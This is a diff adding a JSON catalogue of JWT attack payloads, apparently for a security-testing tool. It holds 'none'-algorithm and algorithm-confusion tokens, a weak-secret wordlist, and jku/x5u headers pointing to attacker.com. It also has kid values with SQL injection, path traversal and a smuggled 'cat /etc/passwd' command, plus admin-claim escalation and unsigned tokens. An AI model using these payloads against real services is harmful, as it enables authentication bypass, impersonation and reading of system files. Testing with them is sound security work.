@@ -1,0 +1,177 @@
+{
+  "description": "JWT (JSON Web Token) Attack Payloads and Test Cases",
+  
+  "algorithm_confusion": {
+    "none_variants": [
+      "none",
+      "None",
+      "NONE",
+      "nOnE",
+      "noNe",
+      "NonE"
+    ],
+    "algorithm_switch": {
+      "description": "Change RS256 to HS256 and sign with public key",
+      "original_alg": "RS256",
+      "attack_alg": "HS256"
+    }
+  },
+  
+  "weak_secrets": [
+    "secret",
+    "password",
+    "123456",
+    "12345678",
+    "qwerty",
+    "abc123",
+    "password123",
+    "admin",
+    "letmein",
+    "welcome",
+    "monkey",
+    "dragon",
+    "master",
+    "login",
+    "passw0rd",
+    "hello",
+    "charlie",
+    "donald",
+    "password1",
+    "qwerty123",
+    "jwt_secret",
+    "jwt-secret",
+    "jwtSecret",
+    "JWT_SECRET",
+    "supersecret",
+    "super_secret",
+    "changeme",
+    "changeit",
+    "private",
+    "privatekey",
+    "private_key",
+    "secret_key",
+    "secretkey",
+    "SECRET_KEY",
+    "key",
+    "mykey",
+    "my_key",
+    "test",
+    "testing",
+    "development",
+    "production",
+    "your-256-bit-secret",
+    "your-384-bit-secret",
+    "your-512-bit-secret",
+    "shhhhh",
+    "shhhhhared-secret",
+    "keyboard cat",
+    "keyboard_cat"
+  ],
+  
+  "header_injection": {
+    "jwk_injection": {
+      "description": "Inject attacker-controlled JWK in header",
+      "header": {
+        "alg": "RS256",
+        "typ": "JWT",
+        "jwk": {
+          "kty": "RSA",
+          "n": "attacker_controlled_n_value",
+          "e": "AQAB"
+        }
+      }
+    },
+    "jku_injection": {
+      "description": "Point jku to attacker-controlled server",
+      "header": {
+        "alg": "RS256",
+        "typ": "JWT",
+        "jku": "https://attacker.com/.well-known/jwks.json"
+      }
+    },
+    "kid_injection": [
+      {
+        "description": "SQL injection via kid",
+        "kid": "' UNION SELECT 'secret'--"
+      },
+      {
+        "description": "Path traversal via kid",
+        "kid": "../../../dev/null"
+      },
+      {
+        "description": "Command injection via kid",
+        "kid": "key_id | cat /etc/passwd"
+      }
+    ],
+    "x5u_injection": {
+      "description": "Point x5u to attacker certificate",
+      "header": {
+        "alg": "RS256",
+        "typ": "JWT",
+        "x5u": "https://attacker.com/cert.pem"
+      }
+    }
+  },
+  
+  "payload_manipulation": {
+    "privilege_escalation": [
+      {"role": "admin"},
+      {"role": "administrator"},
+      {"admin": true},
+      {"is_admin": true},
+      {"isAdmin": true},
+      {"user_type": "admin"},
+      {"userType": "admin"},
+      {"privilege": "admin"},
+      {"privileges": ["admin", "write", "delete"]},
+      {"permissions": ["*"]},
+      {"scope": "admin"},
+      {"groups": ["administrators"]}
+    ],
+    "user_impersonation": {
+      "description": "Change sub/user_id to target user",
+      "fields_to_modify": ["sub", "user_id", "userId", "uid", "email", "username"]
+    },
+    "expiration_bypass": {
+      "description": "Extend or remove token expiration",
+      "techniques": [
+        {"exp": 9999999999},
+        {"exp": 4102444800},
+        "remove_exp_claim_entirely"
+      ]
+    }
+  },
+  
+  "signature_attacks": {
+    "empty_signature": {
+      "description": "Remove signature entirely (keep two dots)",
+      "example": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0."
+    },
+    "null_signature": {
+      "description": "Replace signature with null bytes",
+      "example": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+    }
+  },
+  
+  "test_tokens": {
+    "none_alg_token": "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IlRlc3QgVXNlciIsImlhdCI6MTUxNjIzOTAyMn0.",
+    "expired_token_example": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IlRlc3QiLCJleHAiOjE1MTYyMzkwMjJ9.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"
+  },
+  
+  "detection_indicators": {
+    "success_patterns": [
+      "200 OK with authenticated response",
+      "Access granted to protected resource",
+      "User data returned",
+      "Token accepted message"
+    ],
+    "failure_patterns": [
+      "401 Unauthorized",
+      "403 Forbidden", 
+      "Invalid token",
+      "Token expired",
+      "Signature verification failed",
+      "Invalid algorithm"
+    ]
+  }
+}
